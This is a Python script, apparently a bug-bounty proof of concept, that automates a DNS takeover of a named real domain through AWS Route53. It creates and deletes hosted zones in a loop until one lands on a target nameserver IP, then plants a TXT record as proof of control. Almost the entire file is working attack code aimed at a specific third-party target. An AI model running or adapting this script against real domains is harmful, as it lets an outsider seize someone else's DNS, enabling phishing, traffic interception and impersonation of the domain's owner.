import boto3
import time
import socket
import sys

# =============================================================================
# CONFIGURATION
# =============================================================================

AWS_ACCESS_KEY = ""
AWS_SECRET_KEY = ""

# The domain that is returning REFUSED
TARGET_DOMAIN = "jeu.ricaud.com"

# The IP address of ns1.numberly.com that you are trying to "hit"
TARGET_IP = "205.251.194.254"

POC_TXT_VALUE = "Bugbounty - DNS takeover POC by Rizin"
SLEEP_BETWEEN_ATTEMPTS = 2
MAX_ATTEMPTS = 500

# =============================================================================

client = boto3.client(
    'route53',
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY
)


def get_ns_ips(nameservers):
    """Resolves AWS nameserver hostnames to their IP addresses."""
    ips = []
    for ns in nameservers:
        try:
            clean_ns = ns.strip('.')
            ips.append(socket.gethostbyname(clean_ns))
        except socket.gaierror:
            continue
    return ips


def add_txt_record(zone_id):
    """Adds a TXT record to prove ownership."""
    client.change_resource_record_sets(
        HostedZoneId=zone_id,
        ChangeBatch={
            'Changes': [{
                'Action': 'CREATE',
                'ResourceRecordSet': {
                    'Name': TARGET_DOMAIN,
                    'Type': 'TXT',
                    'TTL': 60,
                    'ResourceRecords': [{'Value': f'"{POC_TXT_VALUE}"'}]
                }
            }]
        }
    )


def main():
    print(f"[*] Starting Takeover Attempt for: {TARGET_DOMAIN}")
    print(f"[*] Target IP to match: {TARGET_IP}")

    attempts = 0
    while True:
        attempts += 1
        if MAX_ATTEMPTS > 0 and attempts > MAX_ATTEMPTS:
            print("[!] Reached maximum attempts. Exiting.")
            break

        caller_ref = str(time.time())

        try:
            # Create the hosted zone
            response = client.create_hosted_zone(
                Name=TARGET_DOMAIN,
                CallerReference=caller_ref
            )

            zone_id = response['HostedZone']['Id']
            assigned_ns = response['DelegationSet']['NameServers']
            assigned_ips = get_ns_ips(assigned_ns)

            sys.stdout.write(f"\r[Attempt {attempts}] Zone: {zone_id} | IPs: {assigned_ips}")
            sys.stdout.flush()

            # Check if our new zone was assigned the Target IP
            if TARGET_IP in assigned_ips:
                print(f"\n\n[!!!] SUCCESS! MATCH FOUND!")
                print(f"[+] The zone {zone_id} now controls the IP {TARGET_IP}")
                print(f"[*] Creating POC record...")
                add_txt_record(zone_id)
                print("[+] Done. Check 'dig TXT {TARGET_DOMAIN} @ns1.numberly.com' in a few minutes.")
                break
            else:
                # Delete and try again
                client.delete_hosted_zone(Id=zone_id)
                time.sleep(SLEEP_BETWEEN_ATTEMPTS)

        except client.exceptions.TooManyHostedZones:
            print("\n[!] Error: AWS Account Limit Reached (Max Zones).")
            break
        except Exception as e:
            if "Throttling" in str(e):
                print("\n[!] Throttled. Sleeping 30s...")
                time.sleep(30)
            else:
                print(f"\n[!] Unexpected Error: {e}")
                break


if __name__ == "__main__":
    main()